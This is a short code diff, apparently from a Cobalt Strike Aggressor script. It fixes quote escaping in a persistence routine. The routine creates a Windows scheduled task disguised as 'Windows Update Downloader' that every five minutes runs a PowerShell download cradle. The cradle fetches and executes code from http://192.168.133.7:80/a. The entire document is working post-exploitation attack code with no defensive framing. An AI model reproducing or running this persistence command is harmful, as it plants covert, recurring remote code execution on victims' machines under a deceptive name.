@@ -59,7 +59,7 @@ sub persist_linkinfo {
 }
 
 sub persist_schjob {
-    bshell($1, 'schtasks /create /TN "Windows Update Downloader" /SC Minute /MO 5 /TR "powershell -nop -c "IEX ((new-object net.webclient).downloadstring('http://192.168.133.7:80/a'))""');
+    bshell($1, 'schtasks /create /TN "Windows Update Downloader" /SC Minute /MO 5 /TR "powershell -nop -c \"IEX ((new-object net.webclient).downloadstring(\'http://192.168.133.7:80/a\'))\"');
     }
 
 popup beacon_top {
